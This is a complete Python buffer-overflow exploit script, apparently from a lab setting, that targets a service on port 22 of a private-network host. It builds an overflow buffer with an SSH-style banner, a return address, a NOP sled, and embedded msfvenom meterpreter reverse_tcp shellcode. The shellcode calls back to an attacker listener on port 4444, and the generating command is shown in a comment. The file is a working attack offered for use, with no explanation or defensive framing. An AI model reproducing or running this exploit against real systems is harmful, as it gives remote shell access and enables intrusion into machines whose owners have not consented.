#!/usr/bin/python

import socket, sys
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("172.16.73.129", 22))

message = sock.recv(1000)

print message

#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -f c
shellcode = ("\xdb\xd2\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x54\xbb\xf9\xad\xcb"
"\x47\x31\x58\x18\x03\x58\x18\x83\xc0\xfd\x4f\x3e\xbb\x15\x0d"
"\xc1\x44\xe5\x72\x4b\xa1\xd4\xb2\x2f\xa1\x46\x03\x3b\xe7\x6a"
"\xe8\x69\x1c\xf9\x9c\xa5\x13\x4a\x2a\x90\x1a\x4b\x07\xe0\x3d"
"\xcf\x5a\x35\x9e\xee\x94\x48\xdf\x37\xc8\xa1\x8d\xe0\x86\x14"
"\x22\x85\xd3\xa4\xc9\xd5\xf2\xac\x2e\xad\xf5\x9d\xe0\xa6\xaf"
"\x3d\x02\x6b\xc4\x77\x1c\x68\xe1\xce\x97\x5a\x9d\xd0\x71\x93"
"\x5e\x7e\xbc\x1c\xad\x7e\xf8\x9a\x4e\xf5\xf0\xd9\xf3\x0e\xc7"
"\xa0\x2f\x9a\xdc\x02\xbb\x3c\x39\xb3\x68\xda\xca\xbf\xc5\xa8"
"\x95\xa3\xd8\x7d\xae\xdf\x51\x80\x61\x56\x21\xa7\xa5\x33\xf1"
"\xc6\xfc\x99\x54\xf6\x1f\x42\x08\x52\x6b\x6e\x5d\xef\x36\xe6"
"\x92\xc2\xc8\xf6\xbc\x55\xba\xc4\x63\xce\x54\x64\xeb\xc8\xa3"
"\x8b\xc6\xad\x3c\x72\xe9\xcd\x15\xb0\xbd\x9d\x0d\x11\xbe\x75"
"\xce\x9e\x6b\xe3\xcb\x08\x38\xe4\x9a\x48\x28\x07\x1d\x59\xf5"
"\x8e\xfb\x09\x55\xc1\x53\xe9\x05\xa1\x03\x81\x4f\x2e\x7b\xb1"
"\x6f\xe4\x14\x5b\x80\x51\x4c\xf3\x39\xf8\x06\x62\xc5\xd6\x62"
"\xa4\x4d\xd3\x93\x6a\xa6\x96\x87\x9a\xd7\x58\x58\x5a\x72\x59"
"\x32\x5e\xd4\x0e\xaa\x5c\x01\x78\x75\x9f\x64\xfa\x72\x5f\xf9"
"\xcb\x09\x69\x6f\x74\x66\x95\x7f\x74\x76\xc3\x15\x74\x1e\xb3"
"\x4d\x27\x3b\xbc\x5b\x5b\x90\x28\x64\x0a\x44\xfb\x0c\xb0\xb3"
"\xcb\x92\x4b\x96\x48\xd4\xb4\x64\x6c\x7d\xdd\x96\x30\x7d\x1d"
"\xfd\xb0\x2d\x75\x0a\x9f\xc2\xb5\xf3\x0a\x8b\xdd\x7e\xda\x79"
"\x7f\x7e\xf7\xdc\x21\x7f\xfb\xc4\x34\x0e\xfc\xfa\x38\xf0\xc1"
"\x2c\x01\x86\x02\xed\x36\x99\x39\x50\x1e\x30\x41\xc6\x60\x11")

buffer = ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
"\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")
buffer += "A"*1055
buffer += "\x53\x93\x42\x7e"
buffer += "A"*4
buffer += "\x90"*100
buffer += shellcode
buffer += "C"*(22000-len(buffer))
buffer += "\r\n"

sock.send(buffer)
time.sleep(5)
sock.close()
